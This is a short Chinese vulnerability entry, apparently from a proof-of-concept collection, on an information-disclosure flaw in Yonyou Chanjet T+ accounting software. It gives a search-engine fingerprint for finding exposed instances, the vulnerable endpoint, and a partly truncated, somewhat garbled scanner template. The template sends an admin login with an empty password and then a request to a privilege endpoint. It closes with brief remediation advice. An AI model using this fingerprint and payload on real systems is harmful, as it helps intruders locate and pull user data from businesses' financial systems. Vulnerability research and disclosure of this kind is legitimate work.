# 用友畅捷通TPlusUfida存在信息泄露

- **系统**：用友　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app.name="畅捷通 T+"`
- **请求**：`POST /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1`

**请求体 / payload**
```
1. Hunter
app.name="畅捷通 T+"
1. 部分界面如下
3、隐患url,复现如下
id: chanjet-getdecallusers-infoleak
info:
name: 用友-畅捷通T+-Ufida-信息泄露
author: m0be1
severity: high
http:
- raw:
-
Host: {{Hostname}}
Content-Length: 278
Content-Type: application/json
{"AccountNum": "000", "UserName": "admin", "Password": "", "rdpYear": "2023", "rdpMonth": "5", "rdpDate": "17", "webServiceProcessID": "admin", "ali_csessionid": "", "ali_sig": "", "ali_token": "", "ali_scene": "", "role": "", "aqdKey": "", "fromWhere": "browser", "cardNo": ""}
-
POST /tplus/sm/privilege/ajaxpro/Ufida.T.SM.UIP.Privilege.PreviligeControl,Ufida.T.SM.…（脚本共 1025 字，完整版见原文）
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。